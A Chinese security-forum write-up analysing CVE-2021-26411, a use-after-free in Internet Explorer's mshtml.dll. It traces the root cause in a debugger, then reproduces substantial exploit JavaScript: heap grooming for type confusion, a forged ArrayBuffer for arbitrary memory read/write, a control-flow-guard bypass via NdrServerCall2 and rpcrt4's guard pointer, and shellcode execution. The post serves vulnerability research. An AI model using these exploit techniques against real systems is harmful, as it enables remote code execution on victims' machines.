> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [bbs.pediy.com](https://bbs.pediy.com/thread-271572.htm)

> [原创] CVE-2021-26411 漏洞分析笔记

这个漏洞分析了太多时间了, 有些地方没细看, 如有一些分析错误的地方, 请各位师傅指正...

### 1. 漏洞信息

CVE-2021-26411 该漏洞存在于 iexplore.exe mshtml.dll 模块, 在 JS9 引擎处理 dom 对象时, 由于未对 nodevalue 对象的有效性做判断, 所导致的 UAF 漏洞, 该漏洞可实现 RCE.

### 2. 漏洞分析

漏洞 poc

 

poc 比较简单, 首先创建了一个 element.

 

创建了 2 个 Attribute 属性.

 

声明了一个对象 obj, 将 obj 的 valueof 函数进行了重载, 重载后的函数会清空 element 的所有属性

 

attr1 赋值 obj,attr2 赋值 123, 然后将将这两个属性赋值于 element

 

最后清除 element 的 attr1 属性.

通过 poc 来看, 最有可能产生 uaf 的代码可能是, obj.valueof 重载后的回调函数, 和最后 element 清除 attr1 属性的操作. 但是并不确定 obj.valueof() 何时会被调用, 代码中没有直接调用.

 

开始进行调试, 程序会中断于此处, edx 是 CAttrArray, 此处为空, 在取偏移为 0xC 的值时, 引发了空指针异常.

 

![](https://bbs.pediy.com/upload/tmp/893960_SX3N47BPBXX7M87.png)

 

通过调用堆栈来看, 程序会通过 CElement::ie9_removeAttrubuteNode->ie9_removeAttributeNodeInternal->CattrArray::Destroy 函数调用清除 attr1.

```
element.removeAttributeNode(attr1);

```

![](https://bbs.pediy.com/upload/tmp/893960_N2K5769YCM42USP.png)

 

下面对 CElement::ie9_removeAttributeNodeInternal 函数进行分析

 

![](https://bbs.pediy.com/upload/tmp/893960_VD5KGDPVWRQKXHF.png)

 

当前 CElement 对象

 

![](https://bbs.pediy.com/upload/tmp/893960_A9CCMU7FWVYAVMA.png)

 

首先会调用函数查找需要移除的 Attr 对象在 CAttrArray 中的索引

 

![](https://bbs.pediy.com/upload/tmp/893960_9GYMNJ6U23U35SR.png)

 

在 CBase::FindAAIndexNS 中可知 CElement+0x10 位置是 CAttrArray 数组, 在数组中 CAttrArray+8 位置, 可以看到数组.

 

![](https://bbs.pediy.com/upload/tmp/893960_28Y8SAZGZVWYW3Z.png)

 

这个数组中存储了 Attributre 和 nodevalue 对象.

 

poc 中所创建的 obj 应是索引 1 处的 0x165780C4, 为 nodevalue1, 索引 3 处为 nodevalue2,value 值的 0x7b=123.

 

![](https://bbs.pediy.com/upload/tmp/893960_7SNU85GMVMSUSRP.png)

 

![](https://bbs.pediy.com/upload/tmp/893960_FZ7V5EFKKGAJ8CK.png)

 

CBase::FindAAIndexNS 函数返回值为 2, 因为删除的元素是 attr1, 可知索引 2 处是 attr1 的对象. 索引 4 为 attr2 的对象![](https://bbs.pediy.com/upload/tmp/893960_KZHBSNUYKSKPKRY.png)

 

然后程序再次调用该函数获取 nodevalue 对象索引, 此时返回 1.

 

![](https://bbs.pediy.com/upload/tmp/893960_AHBG8GD79HWFFWW.png)

 

接着会调用函数 CBase::GetInfoBSTRat 传入 node_value 对象索引, 获取 node_value 值, 并转换为 BSTR 字符串. 在这个函数中获取 node_value 的操作会触发 valueof 函数的回调, 会调用重载后的函数, 执行 "element.ClearAttribute();" 的操作

 

![](https://bbs.pediy.com/upload/tmp/893960_G9TX5U8SFK4YYF7.png)

 

![](https://bbs.pediy.com/upload/tmp/893960_WP4EHVHDRP9P432.png)

 

![](https://bbs.pediy.com/upload/tmp/893960_43S72HE95YHBR8G.png)

 

而后执行函数删除 CBase::DeleteAt 删除索引 2 处 attr 对象

 

![](https://bbs.pediy.com/upload/tmp/893960_HJR8YMPG6CC5VU2.png)

 

当前 CAttrArray 布局, 可以看到 CAttrArray 由于被清空, attr 和 node_value 元素均已被最后一个对象覆盖.

 

![](https://bbs.pediy.com/upload/tmp/893960_XT5JCFF6637PM99.png)

 

而后再次执行函数 CBase::FindAIndexNS 获取 node_value 索引, 此时由于 CAttrArray 被清空, 已经获取不到了, 此时返回 - 1, 随后调用 DeleteAt 删除 node_value, 但是前面获取的 node_value 索引是 - 1

 

![](https://bbs.pediy.com/upload/tmp/893960_A5K427VGCMC35GR.png)

 

![](https://bbs.pediy.com/upload/tmp/893960_56W5BRUWD2RVP2F.png)

 

传入索引为 - 1 时, 会触发异常将 CAttrArray 置为 null, 在 CAttrArray::Destroy 函数获取成员变量时触发空指针异常.

 

![](https://bbs.pediy.com/upload/tmp/893960_7XKMH8NZ9EA4WW4.png)

 

![](https://bbs.pediy.com/upload/tmp/893960_6XQRK3NUAB9FACN.png)

 

由于在 ClearAttributes(); 函数执行时, CAttrArray 数组中会通过最后一个对象进行覆盖操作, 并且在后面第一次执行 CBase::DeleteAt 中会进行取值. 所以可以通过创建 BSTR 字符串, 赋值给最后一个 nodevalue, 在 SysFreeString 时进行触发释放重引用.

 

修改后 poc 如下:

当前 Array

 

![](https://bbs.pediy.com/upload/tmp/893960_X2F3PS334TRBVQ3.png)

 

![](https://bbs.pediy.com/upload/tmp/893960_QUVUGQPHGJ93TUN.png)

 

执行完 ClearAttributes 后, CAttrArray 被覆盖, 并且 node_value 的 BSTR 字符串已经被释放.

 

![](https://bbs.pediy.com/upload/tmp/893960_PFTWT3HS8KEC6QG.png)

 

BSTR 内存空间被释放 ![](https://bbs.pediy.com/upload/tmp/893960_ZB877XYK653V8MB.png)

 

第一次 DeleteAt 时, nodevalue 中 BSTR 字符串内存空间被释放重引用. 所以该漏洞本质是一个 UAF 类型的漏洞.

 

![](https://bbs.pediy.com/upload/tmp/893960_W2N6FX2ENFSN22D.png)

### 3. 漏洞利用

**漏洞的利用方式是通过两个指针指向该 nodevalue 内存, 进行类型混淆, 通过读写这块内存构造出一个起始地址为 0, 长度为 0xffffffff 的 ArrayBuffer, 然后解析为 DataView, 实现任意地址的读写.**

 

**而后通过构造 RPC_MESSAGE 调用 NdrServerCall 进行任意系统函数的调用, 覆盖 rpcrt4.dll 系统调用为 KiFastSystemCalRetl 关闭 rpcrt4.dll 的 CFG 保护, 然后进行任意函数的跳转. 执行 shellcode.**

 

在第二次 DeleteAt 时, FindAAIndexNS 返回索引为 - 1, 而导致在函数中主动触发异常使 CAttray 被置空, 所以需要绕过异常, 可以在 ClearAttributes 后, 再将 attribute set 回去, 同时在 ClearAttributes 释放内存后, hd2.nodevalue 使用大小为 0x20010 的 dataview 对象占用这块内存空间.

```
att.nodeValue = {
           valueOf: function () {
               hd1.nodeValue = (new alloc1()).nodeValue
               ele.clearAttributes()
               //重引用被释放的内存
               hd2 = hd1.cloneNode()
               //绕过异常
               ele.setAttribute('attribute', 1337)
           }
       }

```

```
function alloc1() {
    var view = new DataView(abf)
    var str = ''
    for (var i = 4; i < abf.byteLength - 2; i += 2)
        str += '%u' + pad0(view.getUint16(i, true).toString(16))
    var result = document.createAttribute('alloc')
    result.nodeValue = unescape(str)
    return result
}

```

![](https://bbs.pediy.com/upload/tmp/893960_T6KX6HZJMJ8HZGQ.png)

 

然后在 removeAttribute 时进行二次释放, 然后使用一个 dict 对象再次占用这块内存. 这样做的目的是进行类型混淆, 通过 hd2.nodevalue 读取和修改 hd0.nodevalue 内存.

```
function alloc2() {
           // 创建字典对象
           var dic1 = new ActiveXObject('Scripting.Dictionary')
           var dic2 = new ActiveXObject('Scripting.Dictionary')
           dic2.add(0, 1)
           dic1.add(0, dic2.items())
           dic1.add(1, fake)
           dic1.add(2, arr)
           for (i = 3; i < 0x20010 / 0x10; ++i)
               dic1.add(i, 0x12341234)
           return dic1.items()
       }
 var alloc = alloc2()
 // 触发valueof函数回调
 ele.removeAttributeNode(att)
 //再次重引用removeAttributeNode后被释放的内存
 hd0.nodeValue = alloc
 //通过hd2.nodevalue读取重用后hd0.nodevalue内存
 var leak = new Uint32Array(dump(hd2.nodeValue))
 //fake
 var pAbf = leak[6]
 //arr[]地址
 var pArr = leak[10];

```

```
1:023:x86> dd 0c0b8890
0c0b8890  00000000 00000000 098202b8 00000000 dict2.items();
0c0b88a0  00000009 00000000 09dcdec4 00000000 fakeBuf ArrayBuffer(0x100)
0c0b88b0  00000009 00000000 09dcdf04 00000000 arr  [{}]
0c0b88c0  00000003 00000000 12341234 00000000
0c0b88d0  00000003 00000000 12341234 00000000
0c0b88e0  00000003 00000000 12341234 00000000
0c0b88f0  00000003 00000000 12341234 00000000
0c0b8900  00000003 00000000 12341234 00000000

```

然后取出 fakeBuf 的地址, 并刷新 nodevalue 的内存写入前 40 个字节地址.

```
function flush() {
            hd1.nodeValue = (new alloc1()).nodeValue
            hd2.nodeValue = 0
            hd2 = hd1.cloneNode()
        }
var VT_I4 = 0x3;
var VT_DISPATCH = 0x9;
var VT_BYREF = 0x4000;
var bufArr = new Array(0x10);
var fakeArr = new Uint32Array(fake);
for (var i = 0; i < 0x10; i++) {
     setData(i + 1, new Data(VT_BYREF | VT_I4, pAbf + i * 4));
}
flush();

```

![](https://bbs.pediy.com/upload/tmp/893960_XEH4Z2MQ5JNQ5AS.png)

 

再次将这些内存地址读取至 bufArr[i] 中, 取出 fakeBuf 属性

```
ref = new VBArray(hd0.nodeValue);
for (var i = 0; i < 0x10; i++) {
    bufArr[i] = ref.getItem(i + 1);
}
ref = null;
setData(1, new Data(VT_BYREF | VT_I4, bufArr[4]));
setData(2, new Data(VT_BYREF | VT_I4, bufArr[4] + 0x04));
setData(3, new Data(VT_BYREF | VT_I4, bufArr[4] + 0x1c));
flush();

```

Int32Array,ArrayBuffer 内存结构参考, 64 位下有所差别

```
Struct Int32Array     allocated at Custom Heap
{
    void* pvftable;
    DOWRD var_2;
    DOWRD var_3;
    DOWRD var_4;
    DOWRD var_5;
    DOWRD var_6;
    DOWRD size;            //条目的个数，字节数等于这项的值*4
    void* pTypeArrayData;  //Arraybuffer Data
    void* pArrayBuffer;   //Arraybuffer Object
    DWORD var_10;
    DWORD var_11;
    DWORD var_12;
}
Struct ArrayBuffer      allocated at Custom Heap
{
    void* pvftable;
    DOWRD var_2;
    DOWRD var_3;
    DOWRD var_4;
    void* pTypeArrayData;       //Arraybuffer Data
    DWORD size;                 //array bytes
    DWORD var_10;
    DWORD var_11;
}

```

这里对 ArrayBuffer 做了封装, 外层是 JavaScriptDispatch 对象

 

![](https://bbs.pediy.com/upload/tmp/893960_EU34C4UUN7PDFYN.png)

 

![](https://bbs.pediy.com/upload/tmp/893960_DP7FMXAM93AYTPM.png)

 

ArrayBuffer_data 由于前面通过下面这条代码进行初始化, 所以其中存储的是 Array 对象. 也是后面要进行伪造的 ArrayBuffer 对象

```
var fake = new ArrayBuffer(0x100);
var fakeArr = new Uint32Array(fake);

```

![](https://bbs.pediy.com/upload/tmp/893960_WCC8ZNEECVRFE3H.png)

 

刷新后, 0f0 0f4 10c 位置对应着 fakebuf 的属性

 

![](https://bbs.pediy.com/upload/tmp/893960_DMDMTPYCZ2NZD5M.png)

 

然后通过前面申请的指向 fakeBuf 的 fakeArray 对象伪造出一份起始地址为 0x0, 长度为 0xffffffff 的 ArrayBuffer 对象, 将 bufArr 中属性写入 fakeArr, 并将 fake 的 ArrayBuf 虚表指针地址 fakeArr[4] 位置,

 

将 fake 的一些属性进行替换, 并将长度修改为 0xffffffff, 然后将构造好的 ArrayBuffer 写入 node_value 中

```
ref = new VBArray(hd0.nodeValue);
      var vt = ref.getItem(1);
      var gc = ref.getItem(2);
      var bs = ref.getItem(3);
      ref = null;
      for (var i = 0; i < 16; ++i) {
          fakeArr[i] = bufArr[i];
      }
      fakeArr[4] = bs + 0x40;
      fakeArr[16] = vt;
      fakeArr[17] = gc;
      fakeArr[24] = 0xffffffff;
      setData(1, new Data(VT_DISPATCH, bs));
      flush();

```

![](https://bbs.pediy.com/upload/tmp/893960_M7GA62N7EMUFX4Q.png)

 

![](https://bbs.pediy.com/upload/tmp/893960_8B58CX875ZRU7QM.png)

 

然后将这个 ArrayBuffer 解析为 dataview 对象, 就可以实现任意地址读写. 然后通过将对象存储至 arr[{}], 并读取 pArr 值, 实现任意对象地址的读取.

```
function addrOf(obj) {
           arr[0] = obj
           return read(pArr, 32)
       }
write(read(addrOf(hd0) + 0x18, 32) + 0x28, 0, 32)

```

通过任意地址读写泄露模块的基址, 通过 PE 文件结构获取一些函数地址

```
var map = new Map()
var jscript9 = getBase(read(addrOf(map), 32))
var rpcrt4 = getDllBase(jscript9, 'rpcrt4.dll')
var msvcrt = getDllBase(jscript9, 'msvcrt.dll')
var ntdll = getDllBase(msvcrt, 'ntdll.dll')
var kernelbase = getDllBase(msvcrt, 'kernelbase.dll')
var VirtualProtect = getProcAddr(kernelbase, 'VirtualProtect')
var LoadLibraryExA = getProcAddr(kernelbase, 'LoadLibraryExA')

```

而后创建了一个 Attribute 对象 xyz, 并覆盖其函数 normalize(), 修改为 NdrServerCall2

```
var xyz = document.createAttribute('xyz')
var paoi = addrOf(xyz)
var patt = read(addrOf(xyz) + 0x18, 32)
cattr.set(MSHTMLSymbolBuffer, 'normalize', NdrServerCall2)

```

RPC_MESSAGE 结构, 由图中可以看出 Handle 存放了一个 OSF_SCALL 虚表指针, Buffer 位置存放了远程调用中函数的传参, RpcInterfaceInformation 存放了函数接口信息, 通过几个结构体包装了函数的信息, 最终会指向的是函数的指针. 然后最终通过 NdrServerCall2 进行调用.

 

![](https://bbs.pediy.com/upload/tmp/893960_ZM5W8G82PAVY3VZ.png)

 

NdrServerCall2 接收参数 RPC_MESSAGE, 内部会调用 NdrStubCall2 函数

 

![](https://bbs.pediy.com/upload/tmp/893960_KB37ASQ9DZZS37C.png)

 

内部在获取 RPC_MESSAGE 后会对函数偏移进行一些计算, 以及参数做一些处理, 然后进行函数调用

 

![](https://bbs.pediy.com/upload/tmp/893960_KU3ZK4MXWE5KKVR.png)

 

![](https://bbs.pediy.com/upload/tmp/893960_XXW4H4KT38D3JEU.png)

 

第一个值 Handle 是 OSF_SCALL 虚表指针, 通过查看其引用, 可以通过调用函数 I_RpcTransServerNewConnection 函数获取到这个虚表指针填充至 handle.

 

![](https://bbs.pediy.com/upload/tmp/893960_YDB5MBDSBNKZ6S4.png)

 

![](https://bbs.pediy.com/upload/tmp/893960_QYYS2YBCZE98Q9M.png)

 

![](https://bbs.pediy.com/upload/tmp/893960_DNB56AEJGTCWG4F.png)

 

exp 中也是这样进行构造的

```
function aos() {
          var baseObj = createBase()
          var addr = baseObj.addr + baseObj.size
          var I_RpcTransServerNewConnection = getProcAddr(rpcrt4, 'I_RpcTransServerNewConnection')
          prepareCall(addr, I_RpcTransServerNewConnection)
          return read(read(call(addr) - 0xf8, 32), 32)
      }

```

然后对 RPC 结构进行初始化

```
function initRpc() {
           var data = [50, 72, 0, 0, 0, 0, 0, 0, 52, 0, 192, 0, 16, 0, 68, 13, 10, 1, 0, 0, 0, 0, 0, 0, 0, 0, 72, 0, 0, 0, 9, 0, 72, 0, 4, 0, 9, 0, 72, 0, 8, 0, 9, 0, 72, 0, 12, 0, 9, 0, 72, 0, 16, 0, 9, 0, 72, 0, 20, 0, 9, 0, 72, 0, 24, 0, 9, 0, 72, 0, 28, 0, 9, 0, 72, 0, 32, 0, 9, 0, 72, 0, 36, 0, 9, 0, 72, 0, 40, 0, 9, 0, 72, 0, 44, 0, 9, 0, 112, 0, 48, 0, 9, 0, 0]
           var NdrServerCall2 = getProcAddr(rpcrt4, 'NdrServerCall2')
           var NdrOleAllocate = getProcAddr(rpcrt4, 'NdrOleAllocate')
           var NdrOleFree = getProcAddr(rpcrt4, 'NdrOleFree')
           var RPCMessageObject = createArrayBuffer(cbase.size())
           var buffer = createArrayBuffer(0x100)
           var buffer2 = createArrayBuffer(0x200)
           var AttributeVtable = read(patt, 32)
           var MSHTMLSymbolBuffer = createArrayBuffer(0x1000)
           var TransferSyntaxBuffer = createArrayBuffer(syntaxObject.size())
           var PRPC_CLIENT_INTERFACE_Buffer = createArrayBuffer(PRPC_CLIENT_INTERFACE.size())
           var _MIDL_SERVER_INFO_Buffer = createArrayBuffer(_MIDL_SERVER_INFO_.size())
           var rpcProcStringBuffer = createArrayBuffer(data.length)
           writeData(rpcProcStringBuffer, data)
           var _MIDL_STUB_DESC_Buffer = createArrayBuffer(_MIDL_STUB_DESC.size())
           var RPC_DISPATCH_TABLE_Buffer = createArrayBuffer(RPC_DISPATCH_TABLE.size())
           var NdrServerCall2Buffer = createArrayBuffer(4)
           write(NdrServerCall2Buffer, NdrServerCall2, 32)
           write(MSHTMLSymbolBuffer, osf_vft, 32)
           write(MSHTMLSymbolBuffer + 4, 0x89abcdef, 32)
           write(MSHTMLSymbolBuffer + 8, 0x40, 32)
           cattr.set(MSHTMLSymbolBuffer, '__vtguard', cattr.get(AttributeVtable, '__vtguard'))
           cattr.set(MSHTMLSymbolBuffer, 'SecurityContext', cattr.get(AttributeVtable, 'SecurityContext'))
           cattr.set(MSHTMLSymbolBuffer, 'JSBind_InstanceOf', cattr.get(AttributeVtable, 'JSBind_InstanceOf'))
           cattr.set(MSHTMLSymbolBuffer, 'JSBind_TypeId', cattr.get(AttributeVtable, 'JSBind_TypeId'))
           cattr.set(MSHTMLSymbolBuffer, 'normalize', NdrServerCall2)
           cbase.set(RPCMessageObject, 'pSecurityContext', RPCMessageObject + 68)
           write(RPCMessageObject + 76, 1, 32)
           syntaxObject.set(TransferSyntaxBuffer, 'SyntaxVersion.MajorVersion', 2)
           _MIDL_STUB_DESC.set(_MIDL_STUB_DESC_Buffer, 'RpcInterfaceInformation', PRPC_CLIENT_INTERFACE_Buffer)
           _MIDL_STUB_DESC.set(_MIDL_STUB_DESC_Buffer, 'pfnAllocate', NdrOleAllocate)
           _MIDL_STUB_DESC.set(_MIDL_STUB_DESC_Buffer, 'pfnFree', NdrOleFree)
           _MIDL_STUB_DESC.set(_MIDL_STUB_DESC_Buffer, 'pFormatTypes', buffer2)
           _MIDL_STUB_DESC.set(_MIDL_STUB_DESC_Buffer, 'fCheckBounds', 1)
           _MIDL_STUB_DESC.set(_MIDL_STUB_DESC_Buffer, 'Version', 0x50002)
           _MIDL_STUB_DESC.set(_MIDL_STUB_DESC_Buffer, 'MIDLVersion', 0x800025b)
           _MIDL_STUB_DESC.set(_MIDL_STUB_DESC_Buffer, 'mFlags', 1)
           _MIDL_SERVER_INFO_.set(_MIDL_SERVER_INFO_Buffer, 'pStubDesc', _MIDL_STUB_DESC_Buffer)
           _MIDL_SERVER_INFO_.set(_MIDL_SERVER_INFO_Buffer, 'DispatchTable', createArrayBuffer(32))
           _MIDL_SERVER_INFO_.set(_MIDL_SERVER_INFO_Buffer, 'ProcString', rpcProcStringBuffer)
           _MIDL_SERVER_INFO_.set(_MIDL_SERVER_INFO_Buffer, 'FmtStringOffset', buffer2)
           RPC_DISPATCH_TABLE.set(RPC_DISPATCH_TABLE_Buffer, 'DispatchTableCount', 1)
           RPC_DISPATCH_TABLE.set(RPC_DISPATCH_TABLE_Buffer, 'DispatchTable', NdrServerCall2Buffer)
           PRPC_CLIENT_INTERFACE.set(PRPC_CLIENT_INTERFACE_Buffer, 'DispatchTable', RPC_DISPATCH_TABLE_Buffer)
           PRPC_CLIENT_INTERFACE.set(PRPC_CLIENT_INTERFACE_Buffer, 'InterpreterInfo', _MIDL_SERVER_INFO_Buffer)
           PRPC_CLIENT_INTERFACE.set(PRPC_CLIENT_INTERFACE_Buffer, 'Length', PRPC_CLIENT_INTERFACE.size())
           PRPC_CLIENT_INTERFACE.set(PRPC_CLIENT_INTERFACE_Buffer, 'InterfaceId.SyntaxVersion.MajorVersion', 1)
           PRPC_CLIENT_INTERFACE.set(PRPC_CLIENT_INTERFACE_Buffer, 'TransferSyntax.SyntaxVersion.MajorVersion', 2)
           PRPC_CLIENT_INTERFACE.set(PRPC_CLIENT_INTERFACE_Buffer, 'Flags', 0x4000000)
           _RPC_MESSAGE.set(RPCMessageObject, 'RpcInterfaceInformation', PRPC_CLIENT_INTERFACE_Buffer)
           _RPC_MESSAGE.set(RPCMessageObject, 'TransferSyntax', TransferSyntaxBuffer)
           _RPC_MESSAGE.set(RPCMessageObject, 'Handle', MSHTMLSymbolBuffer)
           _RPC_MESSAGE.set(RPCMessageObject, 'DataRepresentation', 16)
           _RPC_MESSAGE.set(RPCMessageObject, 'RpcFlags', 0x1000)
           _RPC_MESSAGE.set(RPCMessageObject, 'Buffer', buffer)
           _RPC_MESSAGE.set(RPCMessageObject, 'BufferLength', 48)
           return RPCMessageObject
       }

```

通过覆盖 rpcrt4_guard_check_icall_fptr 中保存的函数指针, 修改为 KiFastSystemCallRet 关闭 CFG 保护. 使其可以跳转到 shellcode.

```
function killCfg(addr) {
      var cfgobj = new CFGObject(addr)
      if (!cfgobj.getCFGValue()) return
      var guard_check_icall_fptr_address = cfgobj.getCFGAddress()
      var KiFastSystemCallRet = getProcAddr(ntdll, 'KiFastSystemCallRet')
      var tmpBuffer = createArrayBuffer(4)
      // 修改RPCRT4!__guard_check_icall_fptr的属性为PAGE_EXECUTE_READWRITE
      call2(VirtualProtect, [guard_check_icall_fptr_address, 0x1000, 0x40, tmpBuffer])
      // 替换rpcrt4!__guard_check_icall_fptr保存的指针，修改ntdll!LdrpValidateUserCallTarget为改为ntdll!KiFastSystemCallRet
      // 关闭rpcrt4的CFG检查
      write(guard_check_icall_fptr_address, KiFastSystemCallRet, 32)
      // 恢复PRCRT4!__gurad_check_icall_fptr内存属性
      call2(VirtualProtect, [guard_check_icall_fptr_address, 0x1000, read(tmpBuffer, 32), tmpBuffer])
      map.delete(tmpBuffer)
  }

```

执行 shellcode

```
          var shellcode = new Uint8Array([ 0xFC, 0x68, 0x6A, 0x0A, 0x38, 0x1E, 0x68, 0x63, 0x89, 0xD1, 0x4F, 0x68, 0x32, 0x74, 0x91, 0x0C,
0x8B, 0xF4, 0x8D, 0x7E, 0xF4, 0x33, 0xDB, 0xB7, 0x04, 0x2B, 0xE3, 0x66, 0xBB, 0x33, 0x32, 0x53,
0x68, 0x75, 0x73, 0x65, 0x72, 0x54, 0x33, 0xD2, 0x64, 0x8B, 0x5A, 0x30, 0x8B, 0x4B, 0x0C, 0x8B,
0x49, 0x1C, 0x8B, 0x09, 0x8B, 0x09, 0x8B, 0x69, 0x08, 0xAD, 0x3D, 0x6A, 0x0A, 0x38, 0x1E, 0x75,
0x05, 0x95, 0xFF, 0x57, 0xF8, 0x95, 0x60, 0x8B, 0x45, 0x3C, 0x8B, 0x4C, 0x05, 0x78, 0x03, 0xCD,
0x8B, 0x59, 0x20, 0x03, 0xDD, 0x33, 0xFF, 0x47, 0x8B, 0x34, 0xBB, 0x03, 0xF5, 0x99, 0x0F, 0xBE,
0x06, 0x3A, 0xC4, 0x74, 0x08, 0xC1, 0xCA, 0x07, 0x03, 0xD0, 0x46, 0xEB, 0xF1, 0x3B, 0x54, 0x24,
0x1C, 0x75, 0xE4, 0x8B, 0x59, 0x24, 0x03, 0xDD, 0x66, 0x8B, 0x3C, 0x7B, 0x8B, 0x59, 0x1C, 0x03,
0xDD, 0x03, 0x2C, 0xBB, 0x95, 0x5F, 0xAB, 0x57, 0x61, 0x3D, 0x6A, 0x0A, 0x38, 0x1E, 0x75, 0xA9,
0x33, 0xDB, 0x53, 0x68, 0x65, 0x64, 0x7E, 0x7E, 0x68, 0x68, 0x61, 0x63, 0x6B, 0x8B, 0xC4, 0x53,
0x50, 0x50, 0x53, 0xFF, 0x57, 0xFC, 0x53, 0xFF, 0x57, 0xF8, 0x0C, 0x0D, 0xCC, 0x04, 0x00, 0x0B,
0x0A, 0x0A, 0xCA, 0x02, 0xAD, 0x0B, 0x0A, 0x0A, 0x0E, 0x0D, 0x00, 0x01, 0x50, 0x00, 0x0A, 0x0B,
0xFF, 0x0E, 0x0C, 0xEA, 0xEA, 0x0A, 0x0B, 0xFF, 0x0E, 0x04, 0xCA, 0x02, 0x0A, 0xEC, 0x0E, 0x0C,
0xDE, 0x0E, 0x04, 0x0B, 0xFF, 0x0E, 0xED, 0x0A, 0x0A, 0x0E, 0x0C, 0xDE, 0xCA, 0x02, 0x0A, 0xEC,
0x0E, 0x0C, 0xDE, 0x0E, 0xEA, 0x0D, 0x0B, 0xFF, 0x0E, 0x32, 0x0B, 0xFF, 0x0E, 0x0A, 0x0E, 0xCA,
0x02 ])
    var msi = call2(LoadLibraryExA, [newStr('msi.dll'), 0, 1]) + 0x5000
    var tmpBuffer = createArrayBuffer(4)
    call2(VirtualProtect, [msi, shellcode.length, 0x4, tmpBuffer])
    writeData(msi, shellcode) // mov eax, 0x1337 ; ret
    call2(VirtualProtect, [msi, shellcode.length, read(tmpBuffer, 32), tmpBuffer])
    var result = call2(msi, [])

```

![](https://bbs.pediy.com/upload/tmp/893960_HDS6REYF2TAP6JT.png)

### 参考链接:

https://enki.co.kr/blog/2021/02/04/ie_0day.html

 

https://ha.cker.in/index.php/Article/17190

 

https://iamelli0t.github.io/2021/03/12/CVE-2021-26411.html

 

https://paper.seebug.org/1579/

[【公告】欢迎大家踊跃尝试高研班 11 月试题，挑战自己的极限！](https://bbs.pediy.com/thread-270220.htm)

最后于 3 小时前 被 AshCrimson 编辑 ，原因：

[#漏洞分析](forum-150-1-153.htm) [#漏洞利用](forum-150-1-154.htm) [#UAF](forum-150-1-158.htm) [#Windows](forum-150-1-160.htm)